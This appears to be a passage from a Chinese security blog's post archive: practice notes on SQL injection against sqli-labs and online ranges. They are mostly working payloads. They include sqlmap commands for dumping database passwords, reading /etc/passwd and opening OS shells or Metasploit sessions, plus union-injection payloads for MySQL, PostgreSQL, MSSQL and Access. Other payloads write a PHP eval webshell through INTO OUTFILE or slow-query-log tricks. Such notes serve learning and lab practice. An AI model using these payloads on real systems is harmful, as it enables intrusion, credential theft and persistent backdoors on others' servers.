http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span></span><br><span class="line"><span class="code">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span></span><br><span class="line"><span class="code">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span></span><br><span class="line"><span class="code">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span></span><br><span class="line"><span class="code">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span></span><br><span class="line"><span class="code">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="code">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span></span><br><span class="line"><span class="code">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span></span><br><span class="line"><span class="code">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span></span><br><span class="line"><span class="code">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;</span></span><br><span class="line"><span class="code">16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;</span></span><br><span class="line"><span class="code">17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line"><span class="code">18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span></span><br><span class="line"><span class="code">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span></span><br><span class="line"><span class="code">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span></span><br><span class="line"><span class="code">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span></span><br><span class="line"><span class="code"> </span></span><br><span class="line"><span class="code"> </span></span><br><span class="line"><span class="code">简单的注入流程 :</span></span><br><span class="line"><span class="code">1.读取数据库版本，当前用户，当前数据库 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span></span><br><span class="line"><span class="code">2.判断当前数据库用户权限 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span></span><br><span class="line"><span class="code">3.读取所有数据库用户或指定数据库用户的密码 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span></span><br><span class="line"><span class="code">4.获取所有数据库 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span></span><br><span class="line"><span class="code">5.获取指定数据库中的所有表 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span></span><br><span class="line"><span class="code">6.获取指定数据库名中指定表的字段 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span></span><br><span class="line"><span class="code">7.获取指定数据库名中指定表中指定字段的数据 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span></span><br><span class="line"><span class="code">8.file-read读取web文件 </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span></span><br><span class="line"><span class="code">9.file-write写入文件到web </span></span><br><span class="line"><span class="code">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span></span><br><span class="line"><span class="code">执行：python310 sqlmap.py -u &quot;http://219.153.49.228:40042/new_list.php?id=1&quot; --privileges</span></span><br><span class="line"><span class="code">这种比较难判断是不是管理员权限。</span></span><br></pre></td></tr></table></figure><p>我们接下来利用sqli-lab的第6关开看看sqlmap的操作流程，首先我们看有没有注入点</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711202148948.png" alt="image-20240711202148948"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711202445289.png" alt="image-20240711202445289"></p><p>我们再来测一下是不是最高权限<code>python sqlmap.py -u &quot;http://38.147.173.118:81/Less-6/?id=1&quot; --is-dba</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711202559658.png" alt="image-20240711202559658"></p><p>是最高权限用户，接着我们进行爆库，获取所有数据库<code>python sqlmap.py -u &quot;http://38.147.173.118:81/Less-6/?id=1&quot; --dbs</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711202821549.png" alt="image-20240711202821549"></p><p>获取当前数据库<code>python sqlmap.py -u &quot;http://38.147.173.118:81/Less-6/?id=1&quot; --current-db</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711202929694.png" alt="image-20240711202929694"></p><p>获取指定的表，<code>python sqlmap.py -u &quot;http://38.147.173.118:81/Less-6/?id=1&quot; --tables -D &quot;security</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711203050732.png" alt="image-20240711203050732"></p><p>获取指定数据库下的指定表的字段，<code>python sqlmap.py -u &quot;http://38.147.173.118:81/Less-6/?id=1&quot; --columns -T &quot;users&quot; -D &quot;security</code></p><p><img src="C:/Users/31677/AppData/Roaming/Typora/typora-user-images/image-20240711203216425.png" alt="image-20240711203216425"></p><p>获取相关数据，<code>python sqlmap.py -u &quot;http://38.147.173.118:81/Less-6/?id=1&quot; --dump -C &quot;id,password,username&quot; -T &quot;users&quot; -D &quot;security&quot;</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240711203438333.png" alt="image-20240711203438333"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> SQL注入 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Oracle </tag>
            
            <tag> Mongodb </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-SQL注入（二）</title>
      <link href="/post/efd4f8c4.html"/>
      <url>/post/efd4f8c4.html</url>
      
        <content type="html"><![CDATA[<h2 id="MYSQL-PostgreSQL高权限读写"><a href="#MYSQL-PostgreSQL高权限读写" class="headerlink" title="MYSQL/PostgreSQL高权限读写"></a>MYSQL/PostgreSQL高权限读写</h2><p>当mysql的当前用户为高权限用户的时候，即为root用户的时候，我们可以进行读写注入，即我们既可以读出特定的文件，也可以将一些内容写入某些特定文件中，进而可能造成后门代码，从而用<code>getshell</code></p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,load_file(&#x27;d:/w.txt&#x27;),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</span><br></pre></td></tr></table></figure><p>我们可以看到成功从对应的文件中读取出相关的数据</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/21d7e6a25761857c8bc746b9c370a36d.png" alt="21d7e6a25761857c8bc746b9c370a36d"></p><p>数据库中正常读取文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;d:/w.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710161236423.png" alt="image-20240710161236423"></p><p>所以我们可以尝试读取数据库配置文件等重要性文件，进而扩大危害</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/web/mysql/news.php?id=1 UNION SELECT 1,load_file(&#x27;D:\\phpstudy_pro\\WWW\\web\\mysql\\config\\conn.php&#x27;),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710162006256.png" alt="image-20240710162006256"></p><p><strong>为什么使用<code>\\</code>，是因为<code>\</code>会被当成换行符而报错，所以一般在输入相关的路径的时候，都要进行转义的操作</strong></p><p>这个时候又会出现问题了，我们怎么获取配置文件的路径呢？</p><p>常见的路径获取方法有<strong>报错显示</strong>、<strong>遗留文件phpinfo.php</strong>、<strong>漏洞报错</strong>、<strong>平台配置文件</strong>、<strong>爆破</strong>等，根据实际情况进行搜索，这里就不一一列举了</p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION SELECT 1,&#x27;xxxx&#x27;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile &#x27;d:/www.txt&#x27;</span><br><span class="line">数据库写文件：select &#x27;xxx&#x27; into outfile &#x27;d:/1.txt&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710161429961.png" alt="image-20240710161429961"></p><p>我们可以通过写入后门代码来进行<code>getshell</code>，具体例子如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/web/mysql/news.php</span><br><span class="line">?id=1 UNION SELECT 1,&#x27;&lt;?php eval($_POST[&#x27;x&#x27;]);?&gt;&#x27;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile &#x27;D:\\phpstudy_pro\\WWW\\web\\mysql\\3.php&#x27;</span><br></pre></td></tr></table></figure><p>然后用菜刀进行连接</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240710163108179.png" alt="image-20240710163108179"></p><h3 id="secure-file-priv选项"><a href="#secure-file-priv选项" class="headerlink" title="secure_file_priv选项"></a>secure_file_priv选项</h3><p>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secure_file_priv=null #限制mysql不允许导入导出</span><br><span class="line">secure_file_priv=/tmp/ #限制导入导出只发生在/tmp/目录下</span><br><span class="line"> secure_file_priv=    #不对导入导出做限制 </span><br></pre></td></tr></table></figure><p><strong>突破限制：</strong>借助PhpMyAdmin或者其他可控MySQL后台（普通框内注入是不能修改的）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global slow_query_log = 1;//打开MySQL日志记录</span><br><span class="line">set global slow_query_log_file = &quot;Shell路径（后缀.php）&quot;;//设置日志存储路径</span><br><span class="line">select 一句话木马 or sleep(11);//通过日志记录会将这句木马存储到日志中</span><br></pre></td></tr></table></figure><p>变相地相当于mysql主动帮我们存储了一条一句话木马</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132303177-397806947.png" alt="1645094258153-067ee31d-6976-4910-ae1f-ede06442e60d.png"></p><h2 id="PostgreSQL注入"><a href="#PostgreSQL注入" class="headerlink" title="PostgreSQL注入"></a>PostgreSQL注入</h2><p>PostgreSQL的注入和MYSQL注入语句写法有些不一样，这里通过墨者学院在线靶场进行演示说明</p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line">-测列数：</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span></span><br><span class="line">-测显位：第<span class="number">2</span>，<span class="number">3</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;null&#x27;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> 错误</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;null&#x27;</span>,<span class="keyword">null</span>,<span class="keyword">null</span> 正常</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="string">&#x27;null&#x27;</span>,<span class="keyword">null</span> 正常</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="string">&#x27;null&#x27;</span> 错误</span><br><span class="line">其中，<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> 是为了让服务器爆出报错信息的</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132302842-1289601990.png" alt="1645094307341-6ed3ced5-33f0-4de9-b6e2-ce2647bd2d64.png"></p><p><strong>获取相关信息</strong></p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line">-获取信息：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span>,version(),<span class="keyword">null</span>,<span class="keyword">null</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span>,<span class="built_in">current_user</span>,<span class="keyword">null</span>,<span class="keyword">null</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132303093-525659061.png" alt="1645094364551-baada60d-1aa3-4871-a9d6-8219ac3d0876.png"></p><p><strong>获取当前数据库</strong></p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,current_database(),<span class="keyword">null</span>,<span class="keyword">null</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132303332-1002270372.png" alt="1645094607076-41a43dae-ad87-4808-b618-4944bedbc824.png"></p><p><strong>获取所有数据库名</strong></p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,string_agg(datname,<span class="string">&#x27;,&#x27;</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> pg_database</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132303063-1250319251.png" alt="1645094739659-b36ef26a-b4f0-483c-baec-409b323a3362.png"></p><p><strong>获取表名</strong></p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,string_agg(tablename,<span class="string">&#x27;,&#x27;</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> pg_tables <span class="keyword">where</span> schemaname=<span class="string">&#x27;public&#x27;</span></span><br><span class="line"><span class="number">2</span>、<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,string_agg(relname,<span class="string">&#x27;,&#x27;</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> pg_stat_user_tables</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132303312-875727404.png" alt="1645094853779-ae4380f5-ce49-410d-9631-3df781be911f.png"></p><p><strong>获取列名</strong></p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,string_agg(<span class="built_in">column_name</span>,<span class="string">&#x27;,&#x27;</span>),<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;reg_users&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132303162-984439264.png" alt="1645094897111-990734e9-eb09-467d-8516-1ddb9f2a0633.png"></p><p><strong>获取数据</strong></p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,string_agg(<span class="type">name</span>,<span class="string">&#x27;,&#x27;</span>),string_agg(<span class="keyword">password</span>,<span class="string">&#x27;,&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> reg_users</span><br></pre></td></tr></table></figure><p>至此一个完整的mssql注入流程就到这里结束了，当然，可以用sqlmap跑这些冷门数据库，针对mysql数据库我还是建议手注，虽然慢，但是可靠，考的也最多，且易于我们理解注入流程</p><h2 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h2><p>MSSQL也就是我们熟知的SQL Sever，下面介绍SqlServer的高权限注入</p><p><strong>测列数：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 4</span><br><span class="line">and 1=2 union all select null,null,null,null</span><br></pre></td></tr></table></figure><p><strong>测显位：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union all select null,&#x27;null&#x27;,null,null</span><br><span class="line">and 1=2 union all select null,null,&#x27;null&#x27;,null</span><br></pre></td></tr></table></figure><p><strong>获取信息：</strong></p><p>@@version：获取版本信息</p><p>db_name()：获取当前数据库名字</p><p>user,system_user,current_user,user _name：获取当前用户名</p><p>@@SERVERNAME获取服务器主机信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union all select null,db_name(),null,null</span><br></pre></td></tr></table></figure><p> <strong>获取表名：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union all select null,(select top 1 name from moze_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27;),null,null</span><br><span class="line">and 1=2 union all select null,(select top 1 name from moze_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;manage&#x27;)),null,null</span><br></pre></td></tr></table></figure><p><strong>获取列名：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union all select null,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects),null,null</span><br></pre></td></tr></table></figure><p><strong>获取数据：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=2 union all select null,username,password,null from manage</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> SQL注入 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MYSQL </tag>
            
            <tag> MSSQL </tag>
            
            <tag> PostgreSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-SQL注入（一）</title>
      <link href="/post/c970b753.html"/>
      <url>/post/c970b753.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p>脚本代码在实现代码与数据进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时，其中攻击者能通过控制参数传递的自定义值来实现控制SQL语句，从而执行恶意的SQL语句，倘若管理员代码不做任何过滤的话，就可以实现查询到管理员的账号密码，进而实现越权攻击</p><h2 id="SQL注入的产生原理"><a href="#SQL注入的产生原理" class="headerlink" title="SQL注入的产生原理"></a>SQL注入的产生原理</h2><p>两个基本条件：可控变量 特定函数</p><p>常见Payload示例如下</p><p>后端验证代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;;</span><br></pre></td></tr></table></figure><p>注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure><p>拼接后的查询语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; AND password = &#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>这里的<code>&#39;1&#39;=&#39;1&#39;</code>永真，导致忽略了原始的用户名和密码检查，使得返回数据库中所有用户的用户信息</p><h2 id="SQL注入的流程"><a href="#SQL注入的流程" class="headerlink" title="SQL注入的流程"></a>SQL注入的流程</h2><p>1.猜测数据库类型</p><p>2.根据类型选择注入思路</p><h2 id="sqli-lab靶场搭建"><a href="#sqli-lab靶场搭建" class="headerlink" title="sqli-lab靶场搭建"></a>sqli-lab靶场搭建</h2><p>sqli-lab是一个很好的sql注入的练习平台，大家仅仅靠学习相关的知识点是远远不够的，肯定要通过相关的练习（提倡手工注入，拒绝当脚本小子），sqli-lab靶场涉及了很多注入手法，包括联合注入、堆叠注入、报错注入、盲注等等，通过大量的练习，相信我们都能成为大牛子！</p><p>我是在服务器端搭建的，使用的是docker，因为我本机的环境太乱了，mysql根本启动不了🤡🤡🤡</p><p>依次运行下面的命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search sqli-labs</span><br><span class="line"><span class="comment">#选取star最多的拉取，我这里最多的是acgpiano/sqli-labs</span></span><br><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line">docker run -dt --name sqli-labs -p 81:80 --<span class="built_in">rm</span> acgpiano/sqli-labs</span><br></pre></td></tr></table></figure><p>之后在自己的浏览器访问<code>服务器公网IP:81</code>即可，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/9a1b3ff84117370106edcfe794d44568.png" alt="9a1b3ff84117370106edcfe794d44568"></p><p>点击Setup/reset Database for labs，重新加载数据库，如果成功则表示安装成功，如果失败，可能就是你服务器的问题了，然后我们就可以愉快的刷题了</p><h2 id="ACCESS数据库"><a href="#ACCESS数据库" class="headerlink" title="ACCESS数据库"></a>ACCESS数据库</h2><p>Access数据库的特点是只有一个数据库，没有数据库用户，一个数据库下很多不同的表，表中有不同的列（字段），字段下面有对应的值</p><p>Access数据库独立存在，数据库由上至下的等级分别为：数据库名&gt;表名&gt;列名&gt;数据</p><h3 id="普通常规注入"><a href="#普通常规注入" class="headerlink" title="普通常规注入"></a>普通常规注入</h3><p>下面逐步进行注入</p><p>首先第一步猜解字段数，首先使用<code>order by</code>函数进行猜解</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?id = 1513 order by 22 页面正常</span><br><span class="line">?id = 1513 order by 23 页面异常</span><br></pre></td></tr></table></figure><p>表明我们查询到的字段有22个，我们进行组合（已知表名为admin）</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?id = 1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132135072-190382664.png" alt="1645092956142-0111dfb6-4e6d-47ee-8dcb-47a7dbb1ef16.png"></p><p>最后猜解对应的数据（已知为admin和password）</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?id = 1513 UNION SELECT 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912132135161-1740379825.png" alt="1645092994198-858d6a34-14be-42eb-9e0f-47bb81e92e81.png"></p><h3 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h3><p>由于Access是无法知道表名和列名的，所以要通过爆破去爆破出表名和列名，但是如果自定义的字典中没有对应的呢？这个时候就要用到偏移注入了</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">用*替换一个字段</span><br><span class="line">?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin</span><br><span class="line">逐渐减少字段，直到正确，可以发现减到16的时候正常，说明*代表6</span><br><span class="line">?id=1513 UNION SELECT 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id = b.id)</span><br><span class="line">这样注入就会随机爆出字段（源代码）</span><br></pre></td></tr></table></figure><p>以上是一级偏移，当要进行二级偏移时，则再向前移动6位即可，如下所示</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?id=1513 UNION SELECT 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行偏移注入的时候无需知道表名和列名，就可以得到相关的数据（直接爆出源代码）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/9a8bd76dbc312b0f6ae100083286d2ac.png" alt="9a8bd76dbc312b0f6ae100083286d2ac"></p><h2 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a>MYSQL数据库</h2><p>mysql数据库是我们在进行数据库相关注入时遇到的最为常见的数据库之一，sqli-lab上很多数据库都是用mysql数据库为基准的，和Access数据库不同的是，mysql数据库是由不同的用户来进行管理的，即A用户管理A数据库，B用户管理B数据库，A用户没办法看见B用户的数据库，B用户也没办法看见A用户的数据库，但是Mysql中内置了root用户以方便管理，所以在数据库是mysql的情况下，我们要先看看当前数据库的连接用户是不是root，如果是root，就直接开始查自己想要的数据库，如果不是，那就跨库查询，最后查表名的时候一定要带上数据库名称，不然容易查不到</p><p>mysql5.0以上的版本，数据库自带数据库名information_schema，information_schema是个好东西，存储了数据库下的数据库名、表名、列名信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema.schematas:数据库信息</span><br><span class="line">information_schema.tables:记录表名信息</span><br><span class="line">information_schema.columns:记录列名信息</span><br></pre></td></tr></table></figure><p>所以，当数据库类型为mysql的时候，我们率先要看看数据库的版本是不是大于5.0的，如果是，就可以用information_schema，如果不是，那就只能靠字典编写脚本进行暴力破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库版本:version()</span><br><span class="line">数据库用户:看是否需要跨库注入 user()</span><br><span class="line">当前操作系统，看是否支持大小写或文件路径选择:@@version_compile_os</span><br><span class="line">数据库名字:database()</span><br></pre></td></tr></table></figure><p>以下是相关流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆出相关信息，数据库名称、操作系统</span><br><span class="line">http://127.0.0.1:8081/web/mysql/news.php?id=2  UNION ALL SELECT database(),@@version_compile_os,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</span><br><span class="line">#查询表名</span><br><span class="line">UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema=&#x27;syguestbook&#x27;</span><br><span class="line">#查询列名</span><br><span class="line">UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name=&#x27;sy_adminuser&#x27; and table_schema=&#x27;syguestbook&#x27;</span><br><span class="line">#获取指定数据</span><br><span class="line">UNION SELECT username,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy_adminuser</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="sqli-lab例题"><a href="#sqli-lab例题" class="headerlink" title="sqli-lab例题"></a>sqli-lab例题</h3><p>就拿第一关来说，首先打开第一关是下面这种情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202107350.png" alt="image-20240709202107350"></p><p>首先这里让我们输入id为参数，那我们就输入一个<code>?id=1</code>看看会给我们返回什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240709202418639.png" 